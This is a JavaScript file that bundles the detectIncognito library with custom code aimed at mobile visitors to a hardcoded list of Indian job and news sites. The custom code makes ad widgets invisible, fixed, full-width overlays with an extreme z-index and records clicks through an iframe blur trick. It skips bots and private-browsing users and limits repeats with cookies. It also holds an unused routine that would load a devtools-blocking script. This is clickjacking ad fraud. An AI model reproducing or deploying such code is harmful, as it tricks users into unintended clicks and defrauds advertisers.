!function(e,t){"object"==typeof exports&&"object"==typeof module?module.exports=t():"function"==typeof define&&define.amd?define([],t):"object"==typeof exports?exports.detectIncognito=t():e.detectIncognito=t()}(this,(function(){return function(){"use strict";var e={};return{598:function(e,t){var n=this&&this.__awaiter||function(e,t,n,o){return new(n||(n=Promise))((function(r,i){function a(e){try{u(o.next(e))}catch(e){i(e)}}function c(e){try{u(o.throw(e))}catch(e){i(e)}}function u(e){var t;e.done?r(e.value):(t=e.value,t instanceof n?t:new n((function(e){e(t)}))).then(a,c)}u((o=o.apply(e,t||[])).next())}))},o=this&&this.__generator||function(e,t){var n,o,r,i,a={label:0,sent:function(){if(1&r[0])throw r[1];return r[1]},trys:[],ops:[]};return i={next:c(0),throw:c(1),return:c(2)},"function"==typeof Symbol&&(i[Symbol.iterator]=function(){return this}),i;function c(c){return function(u){return function(c){if(n)throw new TypeError("Generator is already executing.");for(;i&&(i=0,c[0]&&(a=0)),a;)try{if(n=1,o&&(r=2&c[0]?o.return:c[0]?o.throw||((r=o.return)&&r.call(o),0):o.next)&&!(r=r.call(o,c[1])).done)return r;switch(o=0,r&&(c=[2&c[0],r.value]),c[0]){case 0:case 1:r=c;break;case 4:return a.label++,{value:c[1],done:!1};case 5:a.label++,o=c[1],c=[0];continue;case 7:c=a.ops.pop(),a.trys.pop();continue;default:if(!(r=a.trys,(r=r.length>0&&r[r.length-1])||6!==c[0]&&2!==c[0])){a=0;continue}if(3===c[0]&&(!r||c[1]>r[0]&&c[1]<r[3])){a.label=c[1];break}if(6===c[0]&&a.label<r[1]){a.label=r[1],r=c;break}if(r&&a.label<r[2]){a.label=r[2],a.ops.push(c);break}r[2]&&a.ops.pop(),a.trys.pop();continue}c=t.call(e,a)}catch(e){c=[6,e],o=0}finally{n=r=0}if(5&c[0])throw c[1];return{value:c[0]?c[1]:void 0,done:!0}}([c,u])}}};function r(){return n(this,void 0,Promise,(function(){return o(this,(function(e){switch(e.label){case 0:return[4,new Promise((function(e,t){var n,o,r="Unknown";function i(t){e({isPrivate:t,browserName:r})}function a(e){return e===eval.toString().length}function c(){void 0!==navigator.maxTouchPoints?function(){var e=String(Math.random());try{window.indexedDB.open(e,1).onupgradeneeded=function(t){var n,o,r=null===(n=t.target)||void 0===n?void 0:n.result;try{r.createObjectStore("test",{autoIncrement:!0}).put(new Blob),i(!1)}catch(e){var a=e;return e instanceof Error&&(a=null!==(o=e.message)&&void 0!==o?o:e),"string"!=typeof a?void i(!1):void i(a.includes("BlobURLs are not yet supported"))}finally{r.close(),window.indexedDB.deleteDatabase(e)}}}catch(e){i(!1)}}():function(){var e=window.openDatabase,t=window.localStorage;try{e(null,null,null,null)}catch(e){return void i(!0)}try{t.setItem("test","1"),t.removeItem("test")}catch(e){return void i(!0)}i(!1)}()}function u(){navigator.webkitTemporaryStorage.queryUsageAndQuota((function(e,t){var n;i(Math.round(t/1048576)<2*Math.round((void 0!==(n=window).performance&&void 0!==n.performance.memory&&void 0!==n.performance.memory.jsHeapSizeLimit?performance.memory.jsHeapSizeLimit:1073741824)/1048576))}),(function(e){t(new Error("detectIncognito somehow failed to query storage quota: "+e.message))}))}function d(){void 0!==self.Promise&&void 0!==self.Promise.allSettled?u():(0,window.webkitRequestFileSystem)(0,1,(function(){i(!1)}),(function(){i(!0)}))}void 0!==(o=navigator.vendor)&&0===o.indexOf("Apple")&&a(37)?(r="Safari",c()):function(){var e=navigator.vendor;return void 0!==e&&0===e.indexOf("Google")&&a(33)}()?(n=navigator.userAgent,r=n.match(/Chrome/)?void 0!==navigator.brave?"Brave":n.match(/Edg/)?"Edge":n.match(/OPR/)?"Opera":"Chrome":"Chromium",d()):void 0!==document.documentElement&&void 0!==document.documentElement.style.MozAppearance&&a(37)?(r="Firefox",i(void 0===navigator.serviceWorker)):void 0!==navigator.msSaveBlob&&a(39)?(r="Internet Explorer",i(void 0===window.indexedDB)):t(new Error("detectIncognito cannot determine the browser"))}))];case 1:return[2,e.sent()]}}))}))}Object.defineProperty(t,"__esModule",{value:!0}),t.detectIncognito=void 0,t.detectIncognito=r,"undefined"!=typeof window&&(window.detectIncognito=r),t.default=r}}[598](0,e),e=e.default}()}));


const bpkc = {
    get: e => (e = document.cookie.match(new RegExp("(?:^|; )" + e.replace(/([.$?*|{}()[\]\\/+^])/g, "$1") + "=([^;]*)"))) ? decodeURIComponent(e[1]) : void 0,
    set: (e, t, o = {}) => {
        (o = {
            path: "/",
            ...o
        }).expires instanceof Date && (o.expires = o.expires.toUTCString());
        let n = unescape(encodeURIComponent(e)) + "=" + unescape(encodeURIComponent(t));
        for (var i in o) {
            n += "; " + i;
            var c = o[i];
            !0 !== c && (n += "=" + c)
        }
        document.cookie = n
    }
};

function isckMobile() {
    var e = navigator.userAgent || navigator.vendor || window.opera,
        t = /android|iphone/i.test(e),
        o = /bot|crawl|spider|baidu|bing|duckduck|google|yandex|yahoo|facebook|twitter/i.test(e),
        n = window.location.hostname,
        i = ["www.updatemarts.in", "upprimarykamaster.in", "www.newsyhunt.com", "www.indiakasamachar.com", "sarkarigroup.in", "www.sarkarigoal.com", "fastrojgar.in", "www.fastrojgar.in", "fastrojgar.com", "www.fastrojgar.com", "www.pkptimes.com", "pkptimes.com"].includes(n),
        e = -330 === (new Date).getTimezoneOffset(),
        n = window.innerWidth < 769;
    return !!(t && !o && i && e && n)
}

function storeipapi() {
    null == bpkc.get("tbcpk") && bpkc.set("tbcpk", 1, {
        secure: 1,
        "max-age": 3600
    }), setTimeout(pvntsys, 50)
}

function pvntsys() {
    var e;
    null != bpkc.get("tbcpk") && ((e = document.createElement("style")).innerHTML = "ins.adsbygoogle.pk{pointer-events:none!important}", document.head.appendChild(e))
}

function checkpkscs(o) {
    if (console.log("checkpkscs"), !document.querySelector(".qdslb") && 0 <= new Date("Mar 12, 2026 00:00:00").getTime() - (new Date).getTime())
        if (console.log("qdslb"), isckMobile()) {
            console.log("isckMobile");
            var e, n = document.querySelector(o);
            if (n && (console.log("run"), null == bpkc.get("tbckt"))) {
                'div[data-widget-id="1751323"]' == o ? ((e = document.createElement("style")).id = "mxAds_stltbl", e.innerHTML = 'div[data-widget-id="1751323"]{height: 40vh; width: 100%; text-align: center; position: fixed; z-index: 99999999999; right: 0; bottom: 0; left: 0; opacity: 0; background: 0; margin: 0 auto; min-height: 1px}') : ((e = document.createElement("style")).id = "mxAds_stltbl", e.innerHTML = o + ' {width: 100%; text-align: center; position: fixed; z-index: 99999999999; right: 0; bottom: 0; left: 0; opacity: 0; background: 0; margin: 0 auto; min-height: 1px}'), document.head.appendChild(e);
                var i = () => {
                    bpkc.set("tbckt", 1, {
                        secure: 1,
                        "max-age": 3600
                    }), storeipapi(), setTimeout(() => {
                        var e = document.querySelector(o);
                        e && e.remove()
                    }, 2e3)
                };
                n.addEventListener("click", () => {
                    i(), console.log("click")
                });
                let t = setInterval(() => {
                    var e = document.querySelector(o+' iframe');
                    null !== e && (clearInterval(t), window.addEventListener("blur", () => {
                        document.activeElement === e && (i(), console.log("clicked"))
                    }))
                }, 100);
               // checkdevtool()
            }
        } else console.log("not run"), bpkc.set("tbckt", 1, {
            secure: 1,
            "max-age": 3600
        })
}

function checkdevtool() {
    var e = document.createElement("script");
    e.src = "https://cdn.jsdelivr.net/npm/disable-devtool", e.setAttribute("disable-devtool-auto", ""), document.body.appendChild(e)
}
pvntsys(), isckMobile() || null != bpkc.get("tbckt") || bpkc.set("tbckt", 1, {
    secure: 1,
    "max-age": 3600
}), detectIncognito().then(function (e) {
    if (!e.isPrivate && (document.querySelector("body.single") || document.querySelector("body.postr.mobilemode") || document.querySelector(".apdy"))) {		

const o = setInterval(function () {
    var selectors = [
        'div[data-widget-id="1756183"]',
        'div[data-widget-id="1751323"]',
        'div[data-widget-id="1756199"]'
    ];

    var randomSelector = selectors[Math.floor(Math.random() * selectors.length)];
    var element = document.querySelector(randomSelector);

    if (element) {
        // Check if the element has the 'data-uid' attribute
        var dataUid = element.getAttribute("data-uid");

        if (dataUid) {
            checkpkscs(randomSelector);
            clearInterval(o);
        } else {
           // console.log("Element found but data-uid is missing.");
        }
    } else {
       // console.log("Element not found");
    }
}, 1000);



    }
}).catch(function (e) {
    console.error(e)
});
